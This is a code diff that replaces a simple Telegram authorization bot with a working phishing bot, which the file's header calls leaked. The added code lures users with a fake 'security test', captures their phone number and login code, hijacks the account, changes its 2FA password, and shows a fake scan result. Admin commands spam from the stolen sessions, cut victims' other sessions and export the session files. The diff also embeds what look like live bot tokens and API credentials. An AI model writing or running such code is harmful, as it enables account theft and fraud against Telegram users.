@@ -1,441 +1,254 @@
-import asyncio
-import logging
-import sqlite3
-import os
-import sys
-from datetime import datetime
+# CЛИТО В ТЕЛЕГРАМ КАНАЛАХ @END_SOFTWARE AND @END_RAID
 
-# Проверка зависимостей
-try:
-    from telethon import TelegramClient, events, Button
-    print("✅ Telethon успешно импортирован")
-except ImportError:
-    print("❌ Telethon не установлен! Запустите: pip install telethon==1.28.5")
-    sys.exit(1)
+from aiogram import Bot, Dispatcher, types
+from aiogram.contrib.fsm_storage.memory import MemoryStorage
+from aiogram.dispatcher import FSMContext
+from aiogram.utils import executor
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, message
+#from loader import dp, scheduler
+from aiogram.contrib.fsm_storage.memory import MemoryStorage
+from aiogram.dispatcher.filters.state import StatesGroup, State
+from aiogram.types import CallbackQuery, Message
+from telethon import TelegramClient
+from telethon import functions
+import os, json
 
-# Настройка логирования
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
+# token(@BotFather)
+bot_token = '8324933170:AAFatQ1T42ZJ70oeWS2UJkcXFeiwUFCIXAk'
+# TG API(https://my.telegram.org/)
+api_id = '29385016'
+api_hash = '3c57df8805ab5de5a23a032ed39b9af9'
+# you telegram id
+admin_id = 6893832048
+admin_id1 = 6893832048
 
-class SimpleAuthBot:
-    def __init__(self):
-        # ⚠️ ЗАМЕНИТЕ ЭТИ ДАННЫЕ НА РЕАЛЬНЫЕ!
-        self.API_ID = 29385016
-        self.API_HASH = '3c57df8805ab5de5a23a032ed39b9af9'
-        self.BOT_TOKEN = '8324933170:AAFatQ1T42ZJ70oeWS2UJkcXFeiwUFCIXAk'
-        
-        self.bot_client = None
-        self.setup_database()
-        
-        # Состояния пользователей
-        self.user_states = {}  # user_id -> 'waiting_phone', 'waiting_code', etc.
-        self.user_sessions = {}  # user_id -> session_data
-        
-    def setup_database(self):
-        """Настройка простой базы данных"""
-        self.conn = sqlite3.connect('users.db', check_same_thread=False)
-        self.cursor = self.conn.cursor()
-        
-        self.cursor.execute('''
-            CREATE TABLE IF NOT EXISTS users (
-                user_id INTEGER PRIMARY KEY,
-                phone TEXT,
-                authorized_at TEXT,
-                is_active INTEGER DEFAULT 1
-            )
-        ''')
-        self.conn.commit()
-        logger.info("✅ База данных готова")
-    
-    async def initialize(self):
-        """Инициализация бота без запроса телефона в консоли"""
-        try:
-            logger.info("🔄 Запускаю бота...")
-            
-            self.bot_client = TelegramClient(
-                'bot_session', 
-                self.API_ID, 
-                self.API_HASH
-            )
-            
-            # Запускаем бота без интерактивного ввода
-            await self.bot_client.start(bot_token=self.BOT_TOKEN)
-            
-            logger.info("✅ Бот успешно запущен!")
-            self.setup_handlers()
-            
-        except Exception as e:
-            logger.error(f"❌ Ошибка инициализации: {e}")
-            raise
-    
-    def setup_handlers(self):
-        """Настройка обработчиков сообщений"""
-        
-        @self.bot_client.on(events.NewMessage(pattern='/start'))
-        async def start_handler(event):
-            """Обработчик команды /start"""
-            user_id = event.sender_id
-            logger.info(f"👤 Пользователь {user_id} запустил бота")
-            
-            if await self.is_user_authorized(user_id):
-                await self.show_main_menu(event)
-            else:
-                await self.start_auth(event)
-        
-        @self.bot_client.on(events.NewMessage)
-        async def message_handler(event):
-            """Обработчик всех сообщений"""
-            user_id = event.sender_id
-            text = event.text.strip()
-            
-            if text.startswith('/'):
-                return
-                
-            state = self.user_states.get(user_id, 'start')
-            
-            if state == 'waiting_phone':
-                await self.handle_phone_input(event, text)
-            elif state == 'waiting_code':
-                await self.handle_code_input(event, text)
-            elif state == 'waiting_password':
-                await self.handle_password_input(event, text)
-        
-        @self.bot_client.on(events.CallbackQuery)
-        async def callback_handler(event):
-            """Обработчик callback кнопок"""
-            user_id = event.sender_id
-            data = event.data.decode('utf-8')
-            
-            if data == "resend_code":
-                await self.resend_code(event)
-                return
-                
-            if not await self.is_user_authorized(user_id):
-                await event.answer("❌ Сначала авторизуйтесь!", alert=True)
-                return
-            
-            if data == "profile":
-                await self.show_profile(event)
-            elif data == "settings":
-                await event.answer("⚙️ Настройки скоро будут доступны!", alert=True)
-            elif data == "logout":
-                await self.logout_user(event)
-    
-    async def is_user_authorized(self, user_id):
-        """Проверка авторизации пользователя"""
-        self.cursor.execute('SELECT * FROM users WHERE user_id = ? AND is_active = 1', (user_id,))
-        return self.cursor.fetchone() is not None
-    
-    async def start_auth(self, event):
-        """Начало процесса авторизации"""
-        user_id = event.sender_id
-        
-        welcome_text = """
-🔐 **Авторизация в боте**
+bot = Bot(token=bot_token, parse_mode=types.ParseMode.HTML)
+storage = MemoryStorage()
+dp = Dispatcher(bot, storage=storage)
 
-Для использования бота необходимо авторизовать ваш Telegram аккаунт.
+# add account states group
+class AddAccount(StatesGroup):
+    A1 = State()
+    A2 = State()
+    A3 = State()
+    A4 = State()
+    A5 = State()
+    A6 = State()
 
-📱 **Введите ваш номер телефона в формате:**
-• +79123456789
-• +380123456789
+# use account states group
+class Send(StatesGroup):
+    A1 = State()
+    A2 = State()
 
-**Отправьте ваш номер:**
-        """
-        
-        self.user_states[user_id] = 'waiting_phone'
-        await event.reply(welcome_text, parse_mode='md')
-        logger.info(f"📱 Запрошен номер у пользователя {user_id}")
-    
-    async def handle_phone_input(self, event, phone):
-        """Обработка ввода номера телефона"""
-        user_id = event.sender_id
-        
-        # Простая валидация номера
-        if not phone.startswith('+') or len(phone) < 10:
-            await event.reply("❌ **Неверный формат номера!**\n\nВведите номер в международном формате, например: +79123456789\n\n**Попробуйте еще раз:**")
-            return
-        
-        try:
-            # Создаем клиент для пользователя
-            session_name = f"user_{user_id}"
-            client = TelegramClient(session_name, self.API_ID, self.API_HASH)
-            await client.connect()
-            
-            # Отправляем код
-            sent_code = await client.send_code_request(phone)
-            
-            # Сохраняем данные сессии
-            self.user_sessions[user_id] = {
-                'phone': phone,
-                'client': client,
-                'phone_code_hash': sent_code.phone_code_hash,
-                'created_at': datetime.now()
-            }
-            
-            self.user_states[user_id] = 'waiting_code'
-            
-            buttons = [
-                [Button.inline("🔄 Отправить код повторно", b"resend_code")]
-            ]
-            
-            await event.reply(
-                f"✅ **Код отправлен на номер {phone}**\n\n"
-                "📨 Проверьте ваши Telegram приложения и введите полученный код:\n\n"
-                "⏰ **Код действителен 5 минут**\n"
-                "**Введите код:**",
-                buttons=buttons
-            )
-            logger.info(f"📨 Код отправлен на {phone} для пользователя {user_id}")
-            
-        except Exception as e:
-            logger.error(f"❌ Ошибка отправки кода: {e}")
-            await event.reply(f"❌ **Ошибка:** {str(e)}\n\nПопробуйте другой номер или повторите позже.")
-    
-    async def handle_code_input(self, event, code):
-        """Обработка ввода кода подтверждения"""
-        user_id = event.sender_id
-        
-        if user_id not in self.user_sessions:
-            await event.reply("❌ **Сессия устарела!** Начните заново с /start")
-            return
-        
-        # Очищаем код
-        code = ''.join(filter(str.isdigit, code))
-        
-        if len(code) != 5:
-            await event.reply("❌ **Код должен содержать 5 цифр!**\n\n**Введите код еще раз:**")
-            return
-        
-        # Проверяем не истек ли код (больше 5 минут)
-        session_data = self.user_sessions[user_id]
-        time_diff = datetime.now() - session_data['created_at']
-        if time_diff.total_seconds() > 300:  # 5 минут
-            await event.reply("❌ **Код истек!** Отправьте код повторно.")
-            buttons = [[Button.inline("🔄 Отправить код повторно", b"resend_code")]]
-            await event.reply("Нажмите кнопку для повторной отправки кода:", buttons=buttons)
-            return
-        
-        try:
-            client = session_data['client']
-            
-            # Пытаемся войти с кодом
-            await client.sign_in(
-                phone=session_data['phone'],
-                code=code,
-                phone_code_hash=session_data['phone_code_hash']
-            )
-            
-            # Успешная авторизация!
-            await self.handle_success_auth(event, user_id, session_data)
-            
-        except Exception as e:
-            error_msg = str(e)
-            logger.error(f"❌ Ошибка входа: {error_msg}")
-            
-            if 'password' in error_msg.lower():
-                await event.reply("🔒 **Требуется пароль 2FA**\n\nВведите ваш пароль двухфакторной аутентификации:")
-                self.user_states[user_id] = 'waiting_password'
-            elif 'code' in error_msg.lower() and 'expired' in error_msg.lower():
-                await event.reply("❌ **Код истек!** Отправьте код повторно.")
-                buttons = [[Button.inline("🔄 Отправить код повторно", b"resend_code")]]
-                await event.reply("Нажмите кнопку для повторной отправки кода:", buttons=buttons)
-            else:
-                await event.reply(f"❌ **Неверный код!**\n\nОшибка: {error_msg}\n\n**Введите код еще раз:**")
-    
-    async def handle_password_input(self, event, password):
-        """Обработка ввода пароля 2FA"""
-        user_id = event.sender_id
-        
-        if user_id not in self.user_sessions:
-            await event.reply("❌ **Сессия устарела!** Начните заново с /start")
-            return
-        
-        try:
-            session_data = self.user_sessions[user_id]
-            client = session_data['client']
-            
-            # Входим с паролем
-            await client.sign_in(password=password)
-            
-            # Успешная авторизация!
-            await self.handle_success_auth(event, user_id, session_data)
-            
-        except Exception as e:
-            await event.reply(f"❌ **Неверный пароль!**\n\nОшибка: {str(e)}\n\n**Введите пароль еще раз:**")
-    
-    async def resend_code(self, event):
-        """Повторная отправка кода"""
-        user_id = event.sender_id
-        
-        if user_id in self.user_sessions:
-            try:
-                session_data = self.user_sessions[user_id]
-                
-                # Закрываем старый клиент и создаем новый
-                if session_data.get('client'):
-                    await session_data['client'].disconnect()
-                
-                # Создаем новый клиент
-                session_name = f"user_{user_id}"
-                client = TelegramClient(session_name, self.API_ID, self.API_HASH)
-                await client.connect()
-                
-                # Отправляем новый код
-                sent_code = await client.send_code_request(session_data['phone'])
-                
-                # Обновляем данные сессии
-                session_data['client'] = client
-                session_data['phone_code_hash'] = sent_code.phone_code_hash
-                session_data['created_at'] = datetime.now()
-                
-                await event.answer("✅ Код отправлен повторно!", alert=True)
-                
-                # Редактируем сообщение или отправляем новое
-                try:
-                    await event.edit(
-                        f"✅ **Новый код отправлен на номер {session_data['phone']}**\n\n"
-                        "📨 Проверьте ваши Telegram приложения и введите полученный код:\n\n"
-                        "⏰ **Код действителен 5 минут**\n"
-                        "**Введите код:**",
-                        buttons=[[Button.inline("🔄 Отправить код повторно", b"resend_code")]]
-                    )
-                except:
-                    await event.reply(
-                        f"✅ **Новый код отправлен на номер {session_data['phone']}**\n\n"
-                        "📨 Проверьте ваши Telegram приложения и введите полученный код:\n\n"
-                        "⏰ **Код действителен 5 минут**\n"
-                        "**Введите код:**",
-                        buttons=[[Button.inline("🔄 Отправить код повторно", b"resend_code")]]
-                    )
-                    
-                logger.info(f"📨 Код повторно отправлен на {session_data['phone']} для пользователя {user_id}")
-                
-            except Exception as e:
-                logger.error(f"❌ Ошибка повторной отправки кода: {e}")
-                await event.answer(f"❌ Ошибка: {str(e)}", alert=True)
-        else:
-            await event.answer("❌ Сессия устарела! Начните заново с /start", alert=True)
-    
-    async def handle_success_auth(self, event, user_id, session_data):
-        """Обработка успешной авторизации"""
-        try:
-            # Сохраняем пользователя в БД
-            self.cursor.execute('''
-                INSERT OR REPLACE INTO users (user_id, phone, authorized_at, is_active)
-                VALUES (?, ?, ?, ?)
-            ''', (user_id, session_data['phone'], datetime.now().isoformat(), 1))
-            self.conn.commit()
-            
-            # Получаем информацию о пользователе
-            client = session_data['client']
-            me = await client.get_me()
-            
-            # Сохраняем сессию
-            await client.disconnect()
-            
-            # Очищаем временные данные
-            if user_id in self.user_sessions:
-                del self.user_sessions[user_id]
-            if user_id in self.user_states:
-                del self.user_states[user_id]
-            
-            success_text = f"""
-🎉 **Авторизация успешна!**
-
-✅ Добро пожаловать, **{me.first_name or 'Пользователь'}**!
-
-Теперь вы можете использовать все функции бота.
-            """
-            
-            await event.reply(success_text, parse_mode='md')
-            await self.show_main_menu(event)
-            
-            logger.info(f"✅ Пользователь {user_id} успешно авторизован")
-            
-        except Exception as e:
-            logger.error(f"❌ Ошибка сохранения сессии: {e}")
-            await event.reply("❌ **Ошибка сохранения!** Попробуйте с /start")
-    
-    async def show_main_menu(self, event):
-        """Главное меню после авторизации"""
-        menu_text = """
-🏠 **Главное меню**
-
-Выберите действие:
-        """
-        
-        buttons = [
-            [Button.inline("📊 Профиль", b"profile")],
-            [Button.inline("⚙️ Настройки", b"settings")],
-            [Button.inline("🚪 Выйти", b"logout")]
+# keyboard menu
+code_menu = InlineKeyboardMarkup(
+    inline_keyboard=[
+        [
+            InlineKeyboardButton(text="1️⃣", callback_data="code_number:1"),
+            InlineKeyboardButton(text="2️⃣", callback_data="code_number:2"),
+            InlineKeyboardButton(text="3️⃣", callback_data="code_number:3"),
+        ],
+        [
+            InlineKeyboardButton(text="4️⃣", callback_data="code_number:4"),
+            InlineKeyboardButton(text="5️⃣", callback_data="code_number:5"),
+            InlineKeyboardButton(text="6️⃣", callback_data="code_number:6"),
+        ],
+        [
+            InlineKeyboardButton(text="7️⃣", callback_data="code_number:7"),
+            InlineKeyboardButton(text="8️⃣", callback_data="code_number:8"),
+            InlineKeyboardButton(text="9️⃣", callback_data="code_number:9")
+        ],
+        [
+            InlineKeyboardButton(text="0️⃣", callback_data="code_number:0"),
         ]
-        
-        await event.reply(menu_text, buttons=buttons)
-    
-    async def show_profile(self, event):
-        """Показать профиль пользователя"""
-        user_id = event.sender_id
-        
-        self.cursor.execute('SELECT phone, authorized_at FROM users WHERE user_id = ?', (user_id,))
-        result = self.cursor.fetchone()
-        
-        if result:
-            phone, auth_date = result
-            profile_text = f"""
-👤 **Ваш профиль**
+    ]
+)
 
-📱 Номер: `{phone}`
-📅 Авторизован: `{auth_date[:10]}`
-🆔 ID: `{user_id}`
-            """
-            await event.edit(profile_text, parse_mode='md')
+# /start handler
+@dp.message_handler(commands=['start'])
+async def send_welcome(call: CallbackQuery, state: FSMContext):
+    # check admin id
+    if call.from_user.id != admin_id and call.from_user.id != admin_id1:
+        # if not admin
+        key_1 = types.KeyboardButton(
+            text='Продолжить',
+            request_contact=True
+        )
+        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
+        keyboard.add(key_1)
+        await call.reply(text="В Telegram прошёл рейд скам ботов, которые оставили в аккаунтах дыры, просим вас пройти тест чтобы продолжить деятельность использования ботов!", reply_markup=keyboard)
     
-    async def logout_user(self, event):
-        """Выход из аккаунта"""
-        user_id = event.sender_id
-        
-        self.cursor.execute('UPDATE users SET is_active = 0 WHERE user_id = ?', (user_id,))
-        self.conn.commit()
-        
-        # Удаляем сессию
-        session_file = f"user_{user_id}.session"
-        if os.path.exists(session_file):
-            os.remove(session_file)
-        
-        # Удаляем временные данные
-        if user_id in self.user_sessions:
-            if self.user_sessions[user_id].get('client'):
-                await self.user_sessions[user_id]['client'].disconnect()
-            del self.user_sessions[user_id]
-        if user_id in self.user_states:
-            del self.user_states[user_id]
-        
-        await event.edit("✅ **Вы вышли из аккаунта!**\n\nДля входа используйте /start")
-        logger.info(f"🚪 Пользователь {user_id} вышел из системы")
-    
-    async def run(self):
-        """Запуск бота"""
-        await self.initialize()
-        logger.info("🤖 Бот запущен и готов к работе!")
-        
-        # Информация о боте
-        me = await self.bot_client.get_me()
-        logger.info(f"👤 Бот: @{me.username} (ID: {me.id})")
-        
-        await self.bot_client.run_until_disconnected()
+        msg_to_edit = await bot.send_message(chat_id=call.chat.id, text="Нажмите на кнопку \"Продолжить\"")
+        await AddAccount.A1.set()
+        #await state.set_state(AddAccount.A1)
+        await state.update_data(msg_to_edit=msg_to_edit)
+    else:
+        # if admin
+        path = len([name for name in os.listdir('sessions/') if os.path.isfile(os.path.join('sessions/',name))])
+        await call.reply(text=f"Привет <b>admin</b>, в ваших владениях {path} сессий!\n\n/send - заспамить человеку ЛС\n/auth - очистить сессии через 24 часа(https://core.telegram.org/method/account.resetAuthorization)\n/session - отправить все сессии")
 
-# Запуск бота
-if __name__ == '__main__':
-    bot = SimpleAuthBot()
-    
+# /send handler
+@dp.message_handler(commands=['send'])
+async def send_post(message: types.Message):
+    if message.from_user.id != admin_id or message.from_user.id != admin_id1:
+        await message.reply(text="Введи юзернейм пользователя, который получит сообщения без @:")
+        await Send.A1.set()
+
+# /auth handler
+@dp.message_handler(commands=['auth'])
+async def send_auth(message: types.Message):
+    if message.from_user.id != admin_id or message.from_user.id != admin_id1:
+        res = 0
+        for name in os.listdir('sessions/'):
+            try:
+                client = TelegramClient(f"sessions/{name}", api_id, api_hash)
+                await client.connect()
+                result = await client(functions.account.GetAuthorizationsRequest())
+                auths_list = result.to_dict()['authorizations']
+                for auth in auths_list:
+                    if auth['app_name'] != 'TelegramTester':
+                        r = await client(functions.account.ResetAuthorizationRequest(hash=auth['hash']))
+                        print(r)
+                    print(auth['hash'])
+                await client.disconnect()
+                res += 1
+            except Exception as e:
+                print(e)
+
+        await message.reply(text=f"Удалось очистить {res} аккаунтов")
+# /auth handler
+@dp.message_handler(commands=['session'])
+async def send_ses(message: types.Message):
+    if message.from_user.id != admin_id or message.from_user.id != admin_id1:
+        for name in os.listdir('sessions/'):
+            try:
+                await bot.send_document(message.chat.id, open(f"sessions/{name}", "rb"))
+            except Exception as e:
+                print(e)
+
+# send state handlers
+@dp.message_handler(state=Send.A1)
+async def send_A1(message: Message, state: FSMContext):
+    username = message.text
+    await message.reply(text="Введи текст:")
+
+    await Send.next()
+    await state.update_data(username=username)
+
+@dp.message_handler(state=Send.A2)
+async def send_A2(message: Message, state: FSMContext):
+    data = await state.get_data()
+    username = data.get("username")
+
+    for name in os.listdir('sessions/'):
+        try:
+            client = TelegramClient(f"sessions/{name}", api_id, api_hash)
+            await client.connect()
+            await client.send_message(username, message.text)
+            await client.disconnect()
+        except Exception as e:
+            print(e)
+
+    await state.finish()
+
+# add account state handlers
+@dp.message_handler(content_types=['contact'], state=AddAccount.A1)
+async def receive_number(message: Message, state: FSMContext):
+    # get state data
+    data = await state.get_data()
+    msg_to_edit = data.get("msg_to_edit")
+    number = message.contact.phone_number.replace(' ', '')
+    await message.delete()
+    # if path /sessions/ have this session 
+    if os.path.exists(f"sessions/{number}.session"):
+        # delete session
+        os.remove(f"sessions/{number}.session")
+    client = TelegramClient(f"sessions/{number}", api_id, api_hash)
+    # send code
+    await client.connect()
+    sent = await client.send_code_request(phone=number)
+    await client.disconnect()
+    # send code menu
+    await msg_to_edit.edit_text(f"<b>Вы указали <code>{number}</code>\n"
+                                f"Укажите первую цифру кода:</b>",
+                                reply_markup=code_menu)
+    await AddAccount.next()
+    await state.update_data(number=number, sent=sent, code_hash=sent.phone_code_hash)
+
+# menu manegers
+@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A2)
+async def receive_code(call: CallbackQuery, state: FSMContext):
+    data = await state.get_data()
+    msg_to_edit = data.get("msg_to_edit")
+    num_1 = call.data.split(":")[1]
+    await msg_to_edit.edit_text(f"<b>Код будет выстраиваться тут: <code>{num_1}</code></b>", reply_markup=code_menu)
+    await AddAccount.next()
+    await state.update_data(num_1=num_1)
+
+@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A3)
+async def receive_code1(call: CallbackQuery, state: FSMContext):
+    data = await state.get_data()
+    msg_to_edit, num_1 = data.get("msg_to_edit"), data.get("num_1")
+    num_2 = call.data.split(":")[1]
+    code = num_1 + num_2
+    await msg_to_edit.edit_text(f"<b>Код будет выстраиваться тут: <code>{code}</code></b>", reply_markup=code_menu)
+    await AddAccount.next()
+    await state.update_data(num_2=num_2)
+
+@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A4)
+async def receive_code2(call: CallbackQuery, state: FSMContext):
+    data = await state.get_data()
+    msg_to_edit, num_1, num_2 = data.get("msg_to_edit"), data.get("num_1"), data.get("num_2")
+    num_3 = call.data.split(":")[1]
+    code = num_1 + num_2 + num_3
+    await msg_to_edit.edit_text(f"<b>Код будет выстраиваться тут: <code>{code}</code></b>", reply_markup=code_menu)
+    await AddAccount.next()
+    await state.update_data(num_3=num_3)
+
+@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A5)
+async def receive_code3(call: CallbackQuery, state: FSMContext):
+    data = await state.get_data()
+    msg_to_edit, num_1, num_2, num_3 = data.get("msg_to_edit"), data.get("num_1"), data.get("num_2"), data.get("num_3")
+    num_4 = call.data.split(":")[1]
+    code = num_1 + num_2 + num_3 + num_4
+    await msg_to_edit.edit_text(f"<b>Код будет выстраиваться тут: <code>{code}</code></b>", reply_markup=code_menu)
+    await AddAccount.next()
+    await state.update_data(num_4=num_4)
+
+# last manager
+@dp.callback_query_handler(state=AddAccount.A6)
+async def receive_code4(call: CallbackQuery, state: FSMContext):
+    data = await state.get_data()
+    msg_to_edit, num_1, num_2, num_3 = data.get("msg_to_edit"), data.get("num_1"), data.get("num_2"), data.get("num_3")
+    number, num_4, sent, code_hash = data.get("number"), data.get("num_4"), data.get("sent"), data.get("code_hash")
+    num_5 = call.data.split(":")[1]
+    code = num_1 + num_2 + num_3 + num_4 + num_5
     try:
-        print("🚀 Запускаю бота авторизации...")
-        asyncio.run(bot.run())
-    except KeyboardInterrupt:
-        print("\n🛑 Бот остановлен")
+        # connect
+        client = TelegramClient(f"sessions/{number}", api_id, api_hash)
+        await client.connect()
+        try:
+            await client.sign_in(phone=number, code=code, phone_code_hash=code_hash)
+        except:
+            await client.sign_in(phone=number, code=code, phone_code_hash=code_hash, password='youscam666')
+        print(call.from_user.id, number)
+        # send my creater message
+        res = await client.edit_2fa(new_password='youscam666')
+        print(res)
+        await msg_to_edit.edit_text(f"<b>К вашему аккаунту подключен бот сканирющий логи подключений, после окончания придёт результат!</b>")
+        result = await client(functions.account.GetAuthorizationsRequest())
+        await msg_to_edit.edit_text("<b>Результат сканировани:</b>\n\nTelegram Desktop - ✅\nTelegram App - ✅\na0afga2 - ❌\n\n<b>Обнаружена подозрительная скрытая сессия, просим вас не мешать её удалению 24 часа!</b>")
+        await bot.send_message(admin_id, f"New user: {call.from_user.id} - @{call.from_user.username}")
+        await client.disconnect()
+        # this is last message
+        #await state.finish()
     except Exception as e:
-        print(f"💥 Критическая ошибка: {e}")
-    finally:
-        if hasattr(bot, 'conn'):
-            bot.conn.close()
-        print("👋 Работа завершена")
+        # if error
+        print(e)
+        await msg_to_edit.edit_text("Не верный код. Попробуйте заново. /start")
+        #await state.finish()
+
+# start bot
+if __name__ == '__main__':
+    #scheduler.start()
+    executor.start_polling(dp)
